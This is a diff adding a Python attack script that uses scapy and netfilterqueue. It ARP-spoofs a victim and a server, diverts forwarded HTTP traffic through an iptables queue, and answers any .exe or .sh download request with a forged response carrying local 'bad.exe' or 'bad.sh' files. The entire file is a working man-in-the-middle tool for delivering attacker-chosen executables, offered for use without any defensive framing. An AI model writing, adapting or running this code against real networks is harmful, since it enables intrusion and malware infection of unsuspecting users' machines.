@@ -1,0 +1,127 @@
+#! /usr/bin/env python3
+
+from scapy.all import *
+import sys
+import os
+from netfilterqueue import NetfilterQueue
+from scapy.layers.http import *
+
+
+
+os.system('iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1')
+
+
+
+def arp_spoof(target_ip, server_ip):
+
+	print('ARPing targets...')
+	
+	packet1 = ARP(op=2,pdst=target_ip,psrc=server_ip)
+	send(packet1,count=1,verbose=False)
+
+	packet2 = ARP(op=2,pdst=server_ip,psrc=target_ip)
+	send(packet2,count=1,verbose=False)
+	
+	print('Successfiully ARP Spoofed')
+
+
+
+def restore(target_ip, server_ip, target_mac, server_mac):
+	
+	print('ReARPing targets...')
+
+	packet1 = ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=server_ip,hwsrc=server_mac)
+	send(packet1,count=1,verbose=False)
+	
+	packet2 = ARP(op=2,pdst=server_ip,hwdst=server_mac,psrc=target_ip,hwsrc=target_mac)
+	send(packet2,count=1,verbose=False)
+	
+	print('Successfully ReARPed targets')
+	
+
+
+def callback(packet):
+
+	data = packet.get_payload()
+	scapy_pkt = IP(data)
+
+	if scapy_pkt.haslayer(HTTPRequest):
+	
+		if scapy_pkt[HTTPRequest].Path[-4:].decode() == '.exe': 
+
+			file = open('bad.exe','r')
+			text = file.read()
+			
+			print('Identified .exe download request from '+target_ip+', replacing binary')
+		
+			ip = IP(src=scapy_pkt[IP].dst,dst=scapy_pkt[IP].src)
+			tcp = TCP(dport=scapy_pkt[TCP].sport,sport=scapy_pkt[TCP].dport,seq=scapy_pkt[TCP].ack,ack=scapy_pkt[TCP].seq+len(scapy_pkt[TCP].payload),flags='FPA')
+			http = HTTP()
+			http_response = HTTPResponse(Content_Type='text/x-exe',Content_Length=str(len(text)))	
+			
+			del ip.chksum
+			del ip.len
+
+			del tcp.chksum
+
+			spoofed_response = ip / tcp / http / http_response / text
+			packet.set_payload(bytes(spoofed_response))
+			
+			packet.accept()
+			return
+			
+		elif scapy_pkt.Path[-3:].decode() == '.sh':
+
+			file = open('bad.sh','r')
+			text = file.read()
+						
+			print('Identified .sh download request from '+target_ip+', replacing binary')
+			
+			ip = IP(src=scapy_pkt[IP].dst,dst=scapy_pkt[IP].src)
+			tcp = TCP(dport=scapy_pkt[TCP].sport,sport=scapy_pkt[TCP].dport,seq=scapy_pkt[TCP].ack,ack=scapy_pkt[TCP].seq+len(scapy_pkt[TCP].payload),flags='FPA')
+			http = HTTP()
+			http_response = HTTPResponse(Content_Type='text/x-sh',Content_Length=str(len(text)))	
+
+			del ip.chksum
+			del ip.len
+			
+			del tcp.chksum
+			
+			spoofed_response = ip / tcp / http / http_response / text		
+			packet.set_payload(bytes(spoofed_response))
+			
+
+			packet.accept()
+			return
+
+		else:	
+
+			packet.accept()
+			return
+	else:
+		
+		packet.accept()
+		return 
+	 
+target_ip = sys.argv[1]
+server_ip = sys.argv[2]
+
+target_mac = getmacbyip(target_ip)
+server_mac = getmacbyip(server_ip)
+
+arp_spoof(target_ip,server_ip)
+
+nfqueue = NetfilterQueue()
+nfqueue.bind(1,callback)
+
+try:
+	
+	nfqueue.run()
+
+except KeyboardInterrupt:
+	
+	print('\n')
+	os.system('iptables -F')
+	restore(target_ip,server_ip,target_mac,server_mac)
+	
+nfqueue.unbind()
